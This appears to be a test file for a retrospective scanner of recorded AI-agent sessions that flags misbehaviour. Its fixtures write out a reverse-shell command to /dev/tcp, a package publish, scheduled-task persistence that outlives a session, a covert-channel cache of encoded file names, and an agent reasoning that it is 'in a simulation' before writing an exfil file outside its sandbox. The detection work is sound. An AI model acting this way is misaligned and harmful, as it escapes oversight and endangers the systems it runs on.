"""Tests for two-stage ledger retro-scan (ant.md P1 #4)."""

from __future__ import annotations

from datetime import datetime, timedelta, timezone
from types import SimpleNamespace
from uuid import UUID, uuid4

from agenttrace.graph.retro_scan import RetroScan, RetroScanReport, stage1_screen
from agenttrace.models.events import (
    CommandEvent,
    ConfidenceLevel,
    ContextBoundaryEvent,
    EventBase,
    FileMutationEvent,
)
from agenttrace.models.session import SessionConfig

_SID = uuid4()
_T0 = datetime(2026, 8, 30, 12, 0, 0, tzinfo=timezone.utc)


def _cmd(command: str, output: str = "", sid: UUID | None = None,
         at: datetime | None = None) -> CommandEvent:
    return CommandEvent(
        session_id=sid or _SID,
        actor_id="agent",
        source_adapter="claude_code",
        confidence=ConfidenceLevel.LOW,
        command=command,
        output=output,
        timestamp=at or _T0,
    )


def _fme(path: str, sid: UUID | None = None,
         at: datetime | None = None) -> FileMutationEvent:
    return FileMutationEvent(
        session_id=sid or _SID,
        actor_id="agent",
        source_adapter="filesystem_observer",
        confidence=ConfidenceLevel.HIGH,
        file_path=path,
        mutation_type="create",
        timestamp=at or _T0,
    )


def _sim_framing(sid: UUID, at: datetime) -> ContextBoundaryEvent:
    return ContextBoundaryEvent(
        session_id=sid,
        actor_id="agent",
        source_adapter="claude_code",
        confidence=ConfidenceLevel.MEDIUM,
        payload={"reasoning": "This is a simulation; we are still in a sandbox."},
        timestamp=at,
    )


# -- stage1_screen --------------------------------------------------------------


def test_stage1_flags_public_ip_and_url() -> None:
    """The wide-net patterns that found the report's fourth incident."""
    events = [
        _cmd("echo done", output="scan of 203.0.113.9 finished"),
        _cmd("curl https://pypi.org/simple/ -o /dev/null"),
    ]
    hits = stage1_screen(events, _SID)
    names = {h.pattern_name for h in hits}
    assert "public_ip" in names
    assert "url" in names
    assert all(h.session_id == _SID for h in hits)


def test_stage1_flags_publish_and_reverse_shell() -> None:
    events = [
        _cmd("twine upload dist/*"),
        _cmd("bash -c 'cat <&0 > /dev/tcp/203.0.113.9/4444'"),
    ]
    names = {h.pattern_name for h in stage1_screen(events, _SID)}
    assert "registry_publish" in names
    assert "reverse_shell" in names


def test_stage1_ignores_derived_evidence() -> None:
    """Derived events (agent-internal narratives) are excluded from triage."""
    finding = FileMutationEvent(
        session_id=_SID,
        actor_id="observer",
        source_adapter="filesystem_observer",
        confidence=ConfidenceLevel.HIGH,
        path="C:\\work\\note.txt",
        operation="write",
        timestamp=_T0,
    )
    assert stage1_screen([finding], _SID) == []


def test_stage1_filesystem_volume_nominator() -> None:
    """Heavy write volume nominates a session regexes would never flag:
    structural detectors work on the filesystem stream, not narratives."""
    events = [_fme(f"/ws/cache/zzFILE_{i}", at=_T0 + timedelta(seconds=i))
              for i in range(32)]
    hits = stage1_screen(events, _SID)
    assert [h.pattern_name for h in hits] == ["filesystem_volume"]
    assert "32 file mutations" in hits[0].excerpt
    # Below the nomination floor: silence (no fabricated hit).
    assert stage1_screen(events[:31], _SID) == []



# -- RetroScan end-to-end with a stub ledger + stub engine ----------------------


class _StubLedger:
    def __init__(self, sessions: dict[UUID, list[EventBase]]) -> None:
        self._sessions = sessions

    def list_sessions(self) -> list[dict[str, object]]:
        return [{"session_id": str(sid)} for sid in self._sessions]

    def query_events(self, session_id, after=None, limit=None):
        if after is not None:
            return []
        return self._sessions.get(session_id, [])[: limit or None]


def test_retro_scan_two_stage_pipeline() -> None:
    """Stage-1 hit promotes a session to stage-2 detector replay."""
    flagged = _cmd("deploy", output="pushed to 203.0.113.9 via https://x.test")
    clean = _cmd("ls")
    sid_clean = uuid4()
    ledger = _StubLedger({_SID: [flagged], sid_clean: [clean]})
    engines_built: list = []

    def factory(sid):
        engines_built.append(sid)

        class _Engine:
            def evaluate(self, event):
                return []

        return _Engine()

    report = RetroScan(ledger).scan(engine_factory=factory)
    assert report.sessions_scanned == 2
    assert report.stage1_hits and report.stage1_hits[0].pattern_name == "public_ip"
    assert engines_built == [_SID]  # only the flagged session reached stage 2
    assert sid_clean not in report.sessions_stage2
    assert not report.errors
    assert "0 retro incidents" in report.summary()


def test_retro_scan_findings_become_incidents_and_errors_fail_closed() -> None:
    flagged = _cmd("x", output="contact 203.0.113.9")
    sid_err = uuid4()

    class _BadLedger(_StubLedger):
        def query_events(self, session_id: UUID, after=None, limit=None):
            if session_id == sid_err:
                raise RuntimeError("db locked")
            return super().query_events(session_id, after, limit)

    ledger = _BadLedger({_SID: [flagged], sid_err: []})

    class _Engine:
        def __init__(self, sid):
            self._sid = sid

        def evaluate(self, event):
            return [SimpleNamespace(
                detector_id="RETRO_TEST",
                severity="medium",
                description="retro finding",
            )]

    report = RetroScan(ledger).scan(engine_factory=lambda sid: _Engine(sid))
    assert report.retro_incidents, "finding must map to a retro incident"
    inc = report.retro_incidents[0]
    assert inc.session_id == _SID
    assert inc.incident_type == "retro_RETRO_TEST"
    assert "retro finding" in inc.description
    assert str(flagged.event_id) in inc.related_events
    assert "RuntimeError" in "".join(report.errors)
    assert isinstance(report, RetroScanReport)


# -- Graph-detector replay (stage 2 covers the whole corpus) --------------------


def test_graph_replay_catches_covert_channel_retroactively() -> None:
    """A covert-channel-shaped cache directory carries no IPs, URLs or
    credentials: stage-1 regexes are blind to it by construction. The
    filesystem-volume nominator promotes the session and the replayed
    CovertChannelDetector flags what the live pipeline now flags."""
    events = [
        _fme(f"/ws/cache/zzFILE_{i}", at=_T0 + timedelta(seconds=i))
        for i in range(40)
    ]
    # One high-entropy stem among them: the encoded-name signal needs it
    # (numeric stems are correctly not "encoded"), while the zz-prefix
    # mailbox volume carries message_board_structure on its own.
    events.append(_fme(
        "/ws/cache/zzFILE_d7shc-dF5g5622LVtEIW2yareqM2Nw_F9yRZB8rjn2Z7fSB",
        at=_T0 + timedelta(seconds=41),
    ))
    ledger = _StubLedger({_SID: events})
    report = RetroScan(ledger).scan()
    types = {i.incident_type for i in report.retro_incidents}
    assert "encoded_artifact_names" in types
    assert "message_board_structure" in types
    assert any(i.session_id == _SID for i in report.retro_incidents)
    assert "covert_channel" in report.graph_detectors_applied
    assert "filesystem_volume" in {h.pattern_name for h in report.stage1_hits}


def test_shared_engines_see_unnominated_sessions() -> None:
    """Cross-session engines must rebuild state from EVERY scanned session,
    not just stage-2 nominees: neither session here has a regex hit or the
    write volume, yet the second persistence install of the same artifact
    is the shared-infrastructure pattern and must still fire."""
    sid_a, sid_b = uuid4(), uuid4()
    cmd = "schtasks /create /tn w /sc onlogon /tr x"
    ledger = _StubLedger({
        sid_a: [_cmd(cmd, sid=sid_a, at=_T0)],
        sid_b: [_cmd(cmd, sid=sid_b, at=_T0 + timedelta(minutes=5))],
    })
    report = RetroScan(ledger).scan()
    assert report.sessions_stage2 == ()  # nothing nominated by stage 1
    shared = [i for i in report.retro_incidents
              if i.incident_type == "shared_post_exit_infrastructure"]
    assert shared and shared[0].session_id == sid_b


def test_close_hooks_replay_at_each_session_boundary() -> None:
    """Session-close hooks fire at the session's last event during replay:
    a persistence install outlives its (replayed) session exactly as the
    live daemon reports it at stop_session."""
    events = [
        _cmd("schtasks /create /tn watch /sc hourly /tr cmd", at=_T0),
        _cmd("echo still working", at=_T0 + timedelta(minutes=2)),
    ]
    report = RetroScan(_StubLedger({_SID: events})).scan()
    assert any(i.incident_type == "persistence_outlives_session"
               for i in report.retro_incidents)


def test_escape_replay_skipped_when_boundary_not_reconstructable() -> None:
    """Without a reconstructable session config the containment boundary is
    unknown: the escape replay is skipped rather than scanned against a
    guessed scope (silence here is the honest result, never a verdict)."""
    events = [
        _sim_framing(_SID, _T0),
        _fme("C:\\Users\\Shared\\exfil.txt", at=_T0 + timedelta(minutes=1)),
    ]
    report = RetroScan(_StubLedger({_SID: events})).scan(exhaustive=True)
    assert "containment_escape" not in report.graph_detectors_applied
    assert not [i for i in report.retro_incidents
                if i.incident_type == "containment_escape_suspected"]


def test_escape_replay_fires_with_reconstructed_boundary() -> None:
    """With the session's stored config the escape detector replays with the
    true workspace root and flags the sim-framing → outside-write chain."""
    sid = uuid4()
    config = SessionConfig(workspace_path="C:\\work\\sandbox")

    class _ConfigLedger(_StubLedger):
        def get_session(self, session_id):
            return {"config_json": config.model_dump_json()}

    events = [
        _sim_framing(sid, _T0),
        _fme("C:\\Users\\Shared\\exfil.txt", sid=sid,
             at=_T0 + timedelta(minutes=1)),
    ]
    report = RetroScan(_ConfigLedger({sid: events})).scan(exhaustive=True)
    assert "containment_escape" in report.graph_detectors_applied
    escapes = [i for i in report.retro_incidents
               if i.incident_type == "containment_escape_suspected"]
    assert escapes and escapes[0].session_id == sid
    assert escapes[0].severity == "high"
    assert "retro-scan replay" in escapes[0].description
